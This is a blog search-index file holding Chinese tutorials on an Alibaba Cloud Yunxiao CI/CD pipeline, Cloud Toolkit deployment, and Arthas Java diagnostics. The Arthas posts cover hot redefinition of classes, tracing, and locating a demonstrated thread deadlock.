<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>阿里云-云效流水线实践CI/CD</title>
    <url>/2020/03/14/ali-java-flow/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>CI/CD如何实践？可以通过很多方式，一般公司会自己使用jenkins搭建自己的流水线来完成。不过也有很多云上方案，我们今天来看看阿里云效的流水线如何实践。</p>
<h4 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h4><h5 id="新建流水线"><a href="#新建流水线" class="headerlink" title="新建流水线"></a>新建流水线</h5><p>首先登录云效后台(<a href="https://devops.console.aliyun.com/">点击此链接进入云效控制台</a>)，按照流程新建一个企业，然后进入企业选择流水线模块，点击新建流水线，选择一个流水线模版，本文演示使用的是java工程，所以我选择的是java模版 &gt;&gt; “测试、构建、部署到阿里云ESC/自有主机”。</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-1.png" alt="流水线模版选择"></p>
<p>选好模版之后，会直接跳转到流程配置的界面，针对模版进行相应的设置。</p>
<h5 id="流程配置"><a href="#流程配置" class="headerlink" title="流程配置"></a>流程配置</h5><h6 id="添加代码源"><a href="#添加代码源" class="headerlink" title="添加代码源"></a>添加代码源</h6><p>因为是github托管，所以要先进行github账号授权，才能拉取到github仓库的代码，我们直接点击github图标，进行相应授权即可。<br>如果你是自己搭建的git仓库，也可以选择“通用git”的方式，同样很容易配置。</p>
<p>1，分支信息填写：填写代码仓库和分支信息。</p>
<p>2，开启代码源触发，这样后续只需要push代码即可完成流水线的自动构建发布</p>
<ul>
<li>钩上“代码提交”，将WebHook地址复制出来备用，分支填“master”。</li>
</ul>
<p>3，到 Github代码库配置WebHook，路径：代码库 &gt;&gt; Settings &gt;&gt; Webhooks</p>
<ul>
<li>点击 Add Webhook</li>
<li>将 上一步复制的  WebHook 地址，填入 Payload URL</li>
<li>将 Content Type 选择为 “application/json”</li>
<li>选择 Just the push event</li>
</ul>
<p>最后确认添加即可！</p>
<p>编辑页面图例：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-2.png" alt="添加代码源"></p>
<h6 id="配置代码检查和测试"><a href="#配置代码检查和测试" class="headerlink" title="配置代码检查和测试"></a>配置代码检查和测试</h6><p>这个环节，没有什么好配置的，已经帮你默认选择了java代码规约检查。你也可以添加其他任务步骤，如分支检查、代码覆盖率等任务步骤。</p>
<h6 id="构建配置"><a href="#构建配置" class="headerlink" title="构建配置"></a>构建配置</h6><p>1，任务信息：任务名称填写、构建集群选择</p>
<p>2，java构建配置</p>
<ul>
<li>选择jdk版本，我选择的jdk1.8</li>
<li>编辑构建命令，这个一般默认的就好，如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -B clean package -Dmaven.test.skip=<span class="literal">true</span> -Dautoconfig.skip</span><br></pre></td></tr></table></figure>
3，构建物上传配置</li>
<li>制品名称填写，这个很关键，是我们最后构建出来的jar包的名称</li>
<li>打包路径填写，同样很关键，我这个工程的target放在application里的，所以我的地址为：application/target/</li>
</ul>
<h6 id="主机部署配置"><a href="#主机部署配置" class="headerlink" title="主机部署配置"></a>主机部署配置</h6><p>1，填写好任务名称，钩上“部署时下载制品”，并在制品输入项选中我们上面配置的制品</p>
<p>2，添加主机，我这里选中的是“自有主机”，其实也是阿里云的，只不过在另一个账号下而已，它这里的阿里云ecs方式添加只能添加本账号下的，所以迫不得已[笑哭]。<br>这个添加方式我觉得也做的很亲民，只需要将它生成的一串命令copy到自己的主机上执行下即可。<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-3.png" alt="添加主机"></p>
<p>3，部署配置</p>
<ul>
<li>下载路径：/home/admin/app/package.tgz</li>
<li>执行用户：root</li>
<li>部署脚本：我单独写了一个启动脚本放在了服务器上，所以直接执行解压文件执行脚本即可，命令如：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf /home/admin/app/package.tgz -C /home/pro-mall/</span><br><span class="line">sh /root/c.sh restart</span><br></pre></td></tr></table></figure>
4，任务插件配置</li>
</ul>
<p>任务插件有钉钉机器人、邮件和webhook通知三种方式， 我选择的是钉钉通知，毕竟经常使用，所以push触达率高。</p>
<p>因为是写文章测试一下，为了方便，所以我直接在钉钉新建了一个一人也能用的场景群，步骤：</p>
<ul>
<li>进入场景群，点击群聊右侧的智能群助手</li>
<li>选择添加机器人，“自定义-通过webhook接入自定义服务” 机器人</li>
<li>填写机器人名字，我直接写成了：“CI机器人”</li>
<li>选择安全设置，我使用的自定义关键词，然后填写了：“pro-mall”</li>
<li>最后，钩上协议，点击确认，将Webhook的url拷贝出来，填写到流水线的webhook地址上即可</li>
</ul>
<p>效果图例：<br><image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-7.jpeg" width=250></p>
<h5 id="基本信息配置"><a href="#基本信息配置" class="headerlink" title="基本信息配置"></a>基本信息配置</h5><p>基本信息：流水线名称、环境、以及标签信息填写</p>
<p>成员信息：添加流水线的成员，已经默认添加了当前用户</p>
<h5 id="触发设置"><a href="#触发设置" class="headerlink" title="触发设置"></a>触发设置</h5><p>这里的设置有Webhook触发和定时触发两种选择，本文选择Webhook方式。</p>
<p>1，开启代码Webhook触发，将WebHook地址复制出来。</p>
<p>2，到 Github代码库配置WebHook</p>
<p>代码库 &gt;&gt; Settings &gt;&gt; Webhooks，点击 Add Webhook<br>将 Flow 流水线上复制的  WebHook 地址，填入 Payload URL<br>将 Content Type 选择为 “application/json”<br>选择 Just the push event<br>确认添加</p>
<h4 id="任务触发"><a href="#任务触发" class="headerlink" title="任务触发"></a>任务触发</h4><p>1，直接在云效流水线后台，点击运行手动触发</p>
<p>2，修改代码，push到github，通过webhook完成触发</p>
<p>运行图例:<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-5.png" alt="添加主机"></p>
]]></content>
      <categories>
        <category>ci/cd</category>
      </categories>
      <tags>
        <tag>ci/cd</tag>
        <tag>持续集成</tag>
        <tag>持续交付</tag>
        <tag>持续部署</tag>
        <tag>流水线</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-通过cloud toolkit插件实现快速部署和远程诊断</title>
    <url>/2020/06/19/arthas-cloud-toolkit/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Cloud Toolkit是集开发、测试、诊断、部署为一体的免费IDE插件，能帮助开发者实现一键式部署和代码诊断，是提升效率和降低开发成本的利好插件。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;此插件还整合了其他好用的功能，如docker打包等，不过并不是我们今天的主题，本文主要讲的是 如何通过它快速部署应用，以及使用arthas对目标服务器上的java应用进行诊断。</p>
<h4 id="插件安装以及SSH配置"><a href="#插件安装以及SSH配置" class="headerlink" title="插件安装以及SSH配置"></a>插件安装以及SSH配置</h4><p>1，安装插件</p>
<p>插件安装很容易，直接在插件市场里即可找到安装，我这里使用的IDE是intelliJ IDEA，插件安装路径：Preferences &gt;&gt; Plugins &gt;&gt; 搜索： Alibaba Cloud Toolkit</p>
<p>2，配置SSH服务器</p>
<p>插件安装后，我们可以在IDE的底部工具栏看到选项卡：“Alibaba Cloud View”，直接打开它，然后选择：“Host”，添加我们的机器即可。</p>
<h4 id="快速部署java应用"><a href="#快速部署java应用" class="headerlink" title="快速部署java应用"></a>快速部署java应用</h4><p>之前，为了让我的程序走 CI/CD 发布流程，我选择了阿里云的云效流水线，功能很好用，配置也简单，详情可见：<a href="https://32e.co/2020/03/14/ali-java-flow/">阿里云-云效流水线实践CI/CD</a>。</p>
<p>不过，当我体验了这个插件之后，我就暂时停止了流水线的触发开关，改用这个插件来发布了，因为是自己的小项目，所以这样发布，更加灵活可控。</p>
<p>现在，我们就来看看，如何通过它快速的部署我们java应用吧：</p>
<p>1，选择部署方式，选中项目，右键呼出菜单，然后选择：Alibaba Cloud &gt;&gt; Deploy to Host</p>
<p>示例：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy01-1.png" alt="选择部署方式"></p>
<p>2，配置打包参数：</p>
<ul>
<li>选择Upload File方式，并选择打包生成的jar的module目录</li>
<li>配置maven打包命令，通常将maven goal设置为：clean install</li>
<li>添加目标服务器，点击右边👉的加号可以选择之前添加的机器</li>
<li>设置上传文件的目标目录，即上传后的jar保存目录</li>
<li>设置项目的启动脚本命令，脚本需要提前放到服务器上，具体命令如何编写可参考文章：<a href="https://32e.co/2019/05/01/shell-java-jar-manage/">java jar维护脚本</a></li>
</ul>
<p>示例：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy02.png" alt="配置打包参数"></p>
<p>3，部署测试，配置完成后，直接运行即可，插件会自动打包并上传到服务器，自动执行启动命令完成部署，效果如下：</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy03.png"></p>
<h4 id="使用arthas功能诊断"><a href="#使用arthas功能诊断" class="headerlink" title="使用arthas功能诊断"></a>使用arthas功能诊断</h4><p>1，打开cloud toolkit菜单，在“host”里，找到刚才添加的机器，然后点击：More &gt;&gt; Diagnostic，如下图所示：</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/kit01.png"></p>
<p>2，选择Diagnostic后，插件会通过ssh连接到目标机器上，并自动下载arthas，以及自动运行java -jar arthas-boot.jar启动诊断程序，如下图所示：</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/kit02.png"></p>
<p>3，然后，我们只需要选择找罗列的java进程的ID，即可进入arthas面板，开始我们的诊断之旅了。插件的这个功能能 自动连接机器、下载、并启动诊断程序，可以给我们节省很多时间，作为懒人，我表示这很符合我的口味！</p>
]]></content>
      <categories>
        <category>ci/cd</category>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>ci/cd</tag>
        <tag>toolkit</tag>
        <tag>远程诊断</tag>
        <tag>arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-编译和反编译Java类</title>
    <url>/2020/06/17/arthas-compile-decompile/</url>
    <content><![CDATA[<h4 id="命令演示"><a href="#命令演示" class="headerlink" title="命令演示"></a>命令演示</h4><p>1，使用jad命令可以将class字节码文件反编译为java类</p>
<p>命令：jad –source-only 类reference &gt; java类路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>

<p>2，编译java类，生成class字节码文件</p>
<p>命令：mc -d /生成的class文件保存目录 需要生成class文件的java原文件地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mc -d /tmp/arthas /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>注：可以结合sc和redefine快速的实现热更</p>
]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>反编译</tag>
        <tag>jad</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-实现热部署</title>
    <url>/2020/06/17/arthas-hot-deployment/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;正常情况下，如果需要在运行的程序中增加日志、或者修改部分逻辑，那么我们需要提交代码，重新部署后才能生效，这样做，会给我们增加很多不必要的时间成本。所以，支持热部署的重要性就显而易见了。</p>
<p>&nbsp;&nbsp;arthas是阿里出品的代码诊断工具，能有效的协助我们进行问题的定位和处理。本文，我们主要讲的是 如何利用arthas来实现代码热部署，利用arthas-boot.jar包或者使用arthas idea插件都能实现。</p>
<p>&nbsp;&nbsp;注：热部署也算是骚操作了，有风险，不建议在生产环境上操作。</p>
<h4 id="方式一：arthas-boot-jar"><a href="#方式一：arthas-boot-jar" class="headerlink" title="方式一：arthas-boot.jar"></a>方式一：arthas-boot.jar</h4><h5 id="运行arthas程序"><a href="#运行arthas程序" class="headerlink" title="运行arthas程序"></a>运行arthas程序</h5><p>下载arthas jar包，并启动，然后找到对应的java进程，输入编号进入控制台</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

<h5 id="热部署命令步骤"><a href="#热部署命令步骤" class="headerlink" title="热部署命令步骤"></a>热部署命令步骤</h5><p>1，在本地修改好java类，也可以使用jad命令直接在服务器上反编译生成java类后修改，如下：</p>
<p>命令：jad –source-only 类Reference地址 &gt; 反编译文件保存的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>2，编译java类，重新生成class字节码文件</p>
<p>命令：mc -d /生成的class文件保存目录 需要生成class文件的java原文件地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mc -d /tmp/arthas /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>3，找到jvm里面的classLoaderHash</p>
<p>命令：sc -d -f *类名 | grep classLoaderHash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sc -d *UserServiceImpl</span><br><span class="line">或</span><br><span class="line">sc -d *UserServiceImpl | grep classLoaderHash</span><br><span class="line">或</span><br><span class="line">sc -d -f *UserServiceImpl | grep classLoaderHash</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">classLoaderHash   18b4aac2 </span><br></pre></td></tr></table></figure>
<p>注：添加 -f 参数可以把类的字段也输出，如：”sc -d -f *类名”。此命令建议不指定grep，这样输出的参数更多，更有助于我们判断加载类是否准确。</p>
<p>4，进行class热部署</p>
<p>命令：redefine -c 【classLoaderHash】 /编译后的class完整路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redefine -c 【替换为classLoaderHash】 /tmp/arthas/UserServiceImpl.class</span><br></pre></td></tr></table></figure>

<p>5，部署完成，可以访问最新内容</p>
<p>6，退出arthas<br>退出，并未关闭arthas服务，可以重新连接进来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按键：q</span><br></pre></td></tr></table></figure>
<p>退出并关闭arthas服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop 或 shutdown</span><br></pre></td></tr></table></figure>

<p>7，重新链接arthas</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 127.0.0.1 3658</span><br></pre></td></tr></table></figure>
<h5 id="shell快速生成操作脚本"><a href="#shell快速生成操作脚本" class="headerlink" title="shell快速生成操作脚本"></a>shell快速生成操作脚本</h5><p>脚本名称：arthas.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author: chenguolin</span></span><br><span class="line">p1=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;请传入：类Reference！如：sh arthas.sh com.test.UserService&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------start--------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#####################生成热更新命令##################&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1，把class反编译为java类：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;jad --source-only &#x27;</span><span class="variable">$p1</span><span class="string">&#x27; &gt; /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.java&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;2，修改java类，并重新编译为class：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">&#x27;mc -d /tmp/arthas /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.java&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;3，获取类的classLoaderHash：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sc -d *&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27; | grep classLoaderHash&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;4，将class热更到jvm中：&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;redefine -c 【替换为classLoaderHash】 /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.class&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------end----------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh arthas.sh com.test.service.impl.UserServiceImpl</span><br></pre></td></tr></table></figure>
<p>生成脚本示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------start--------------------------</span><br><span class="line"></span><br><span class="line">#####################生成热更新命令##################</span><br><span class="line"></span><br><span class="line">1，把class反编译为java类：</span><br><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.java</span><br><span class="line"></span><br><span class="line">2，修改java类，并重新编译为class：</span><br><span class="line">mc -d &#x2F;tmp&#x2F;arthas &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.java</span><br><span class="line"></span><br><span class="line">3，获取类的classLoaderHash：</span><br><span class="line">sc -d *UserServiceImpl | grep classLoaderHash</span><br><span class="line"></span><br><span class="line">4，将class热更到jvm中：</span><br><span class="line">redefine -c 【替换为classLoaderHash】 &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.class</span><br><span class="line"></span><br><span class="line">----------------------end----------------------------</span><br></pre></td></tr></table></figure>
<h4 id="方式二：arthas-idea插件"><a href="#方式二：arthas-idea插件" class="headerlink" title="方式二：arthas idea插件"></a>方式二：arthas idea插件</h4><h5 id="安装idea插件"><a href="#安装idea插件" class="headerlink" title="安装idea插件"></a>安装idea插件</h5><p>Idea Plugins插件名称：arthas idea，找到安装即可，重启后 在类或方法上 右键，即可看到相关的arthas命令。</p>
<h5 id="生成热部署脚本"><a href="#生成热部署脚本" class="headerlink" title="生成热部署脚本"></a>生成热部署脚本</h5><p>1，代码修改完成后，先执行build recompile命令 进行强制性编译</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/arthas-recompile.png" width=350>


<p>2，然后，在类名上，点击鼠标右键，选择：Arthas Command &gt;&gt; (hot swap)redefine，生成热部署脚本</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/arthas-hot-swap.png" width=550>


<p>3，将拷贝到粘贴板的内容保存到“.sh”可执行文件中，上传到服务器上执行。</p>
<p>当然了，你也可以直接执行此命令，不过命令太长了，不推荐在命令行这么操作，如果你非要问为什么？那你试试就知道了！</p>
<h5 id="执行脚本完成热部署"><a href="#执行脚本完成热部署" class="headerlink" title="执行脚本完成热部署"></a>执行脚本完成热部署</h5><p>将.sh脚本上传到服务器后，直接用sh命令运行，即可完成代码热部署！</p>
<p>注意：执行命令的服务器上必须要有jdk环境</p>
]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>热部署</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-thread命令定位线程死锁</title>
    <url>/2020/06/19/arthas-thread-blocked/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;有时候我们发现应用卡住了，通常是由于某个线程拿住了某个锁， 并且其他线程都在等待这把锁造成的。 为了排查这类问题，arthas提供了thread命令，协助我们快速定位。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;下面我们用个案例去演示一下这个死锁场景，然后用arthas去定位出这个问题。</p>
<h4 id="模拟死锁的场景"><a href="#模拟死锁的场景" class="headerlink" title="模拟死锁的场景"></a>模拟死锁的场景</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object obj1 = <span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> Object obj2 = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Response <span class="title">hb</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj1) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (obj2) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[dead]执行内容111...&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj2) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (obj1) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[dead]执行内容222...&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> Response.success();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="通过thread命令定位"><a href="#通过thread命令定位" class="headerlink" title="通过thread命令定位"></a>通过thread命令定位</h4><p>1，直接使用”thread“命令，输出线程统计信息。其中：BLOCKED 表示目前阻塞的线程数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread</span><br></pre></td></tr></table></figure>
<p>命令效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Threads Total: 76, NEW: 0, RUNNABLE: 19, BLOCKED: 999, WAITING: 18, TIMED_WAITING: 15, TERMINATED: 0,</span><br><span class="line"> Internal threads: 10                                                                               </span><br><span class="line">ID  NAME                     GROUP        PRIORIT STATE   %CPU     DELTA_T TIME    INTERRUP DAEMON  </span><br><span class="line">88  sentinel-time-tick-threa main         5       TIMED_W 3.14     0.006   0:3.618 false    true    </span><br><span class="line">118 arthas-command-execute   system       5       RUNNABL 1.43     0.002   0:0.014 false    true    </span><br><span class="line">-1  C1 CompilerThread2       -            -1      -       0.16     0.000   0:3.077 false    true    </span><br><span class="line">-1  VM Periodic Task Thread  -            -1      -       0.06     0.000   0:0.078 false    true    </span><br><span class="line">2   Reference Handler        system       10      WAITING 0.0      0.000   0:0.017 false    true    </span><br><span class="line">3   Finalizer                system       8       WAITING 0.0      0.000   0:0.011 false    true </span><br></pre></td></tr></table></figure>

<p>2，执行“thread -b”命令，找出当前阻塞其他线程的线程，即造成死锁的罪魁祸首</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -b</span><br></pre></td></tr></table></figure>
<p>命令效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Thread-39&quot; Id&#x3D;93 BLOCKED on java.lang.Object@1820d666 owned by &quot;Thread-38&quot; Id&#x3D;92</span><br><span class="line">    at cn.soilove.expro.controller.TestController.lambda$hb$1(TestController.java:43)</span><br><span class="line">    -  blocked on java.lang.Object@1820d666</span><br><span class="line">    -  locked java.lang.Object@29064ce5 &lt;---- but blocks 7 other threads!</span><br><span class="line">    at cn.soilove.expro.controller.TestController$$Lambda$1407&#x2F;395258860.run(Unknown Source)</span><br><span class="line">    at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure>
<p>注：上面这个命令直接输出了 造成死锁的线程ID，和具体的代码位置，以及当前线程一共阻塞的线程数量：“&lt;—- but blocks 7 other threads!“。是不是很优秀？现在，我们只需要去修改掉这的代码问题即可。</p>
<p>3，其他线程命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thread –all, 显示所有的线程；</span><br><span class="line">thread id, 显示指定线程的运行堆栈；</span><br><span class="line">thread –state：查看指定状态的线程，如：thread –state BLOCKED；</span><br><span class="line">thread -n 3：展示当前最忙的前N个线程并打印堆栈；</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>thread</tag>
        <tag>死锁</tag>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-trace命令和thread命令的妙用</title>
    <url>/2020/06/17/arthas-trace-thread/</url>
    <content><![CDATA[<h4 id="trace命令使用"><a href="#trace命令使用" class="headerlink" title="trace命令使用"></a>trace命令使用</h4><p>trace 能方便的帮助你定位和发现因 RT 高而导致的性能问题缺陷，但每次只能跟踪一级方法的调用链路<br>注：以下命令按”q”退出</p>
<p>1,监控方法的请求链路以及耗时，次数=3，耗时&gt;1毫秒：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trace cn.soilove.expro.webadmin.AdminLoginController login -n 3 <span class="string">&quot;#cost&gt;1&quot;</span></span><br></pre></td></tr></table></figure>
<p>2,将jdk函数执行过程也收集出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trace --skipJDKMethod <span class="literal">false</span> cn.soilove.expro.webadmin.AdminLoginController login -n 3 <span class="string">&quot;#cost&gt;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>跟踪效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Affect(class count: 1 , method count: 1) cost in 344 ms, listenerId: 1</span><br><span class="line">&#96;---ts&#x3D;2020-06-17 13:57:24;thread_name&#x3D;http-nio-8080-exec-2;id&#x3D;1c;is_daemon&#x3D;true;priority&#x3D;5;TCCL&#x3D;org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader@fe9da7</span><br><span class="line">    &#96;---[109.157235ms] cn.soilove.expro.webadmin.AdminLoginController:login()</span><br><span class="line">        +---[0.048382ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserName() #39</span><br><span class="line">        +---[0.025775ms] org.apache.commons.lang3.StringUtils:isEmpty() #39</span><br><span class="line">        +---[0.024296ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserPwd() #40</span><br><span class="line">        +---[0.015797ms] org.apache.commons.lang3.StringUtils:isEmpty() #40</span><br><span class="line">        +---[0.013396ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserName() #44</span><br><span class="line">        +---[0.014851ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserPwd() #44</span><br><span class="line">        +---[108.179494ms] cn.soilove.expro.service.user.AdminUserService:login() #44</span><br><span class="line">        &#96;---[0.046167ms] cn.soilove.expro.common.Response:success() #46</span><br></pre></td></tr></table></figure>

<h4 id="thread命令使用"><a href="#thread命令使用" class="headerlink" title="thread命令使用"></a>thread命令使用</h4><p>thread是线程排查命令</p>
<p>1，一键展示当前最忙的前N个线程并打印堆栈</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -n 3</span><br></pre></td></tr></table></figure>

<p>2，有时候我们发现应用卡住了，通常是由于某个线程拿住了某个锁， 并且其他线程都在等待这把锁造成的。<br>为了排查这类问题，arthas提供了一键找出那个罪魁祸首的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -b</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>thread</tag>
        <tag>线程</tag>
        <tag>trace</tag>
        <tag>链路跟踪</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-使用watch和tt观测方法执行数据</title>
    <url>/2020/06/17/arthas-watch-tt/</url>
    <content><![CDATA[<h4 id="watch命令使用"><a href="#watch命令使用" class="headerlink" title="watch命令使用"></a>watch命令使用</h4><p>1，使用watch命令让你方便的观察到指定方法的调用情况，能观察<br>到的范围为：返回值、抛出异常、入参，通过编写 OGNL 表达式进行对应变量的查看</p>
<p>命令：watch  类reference 方法名称 “{params,returnObj,throwExp}” -x 遍历深度 -n 收集次数</p>
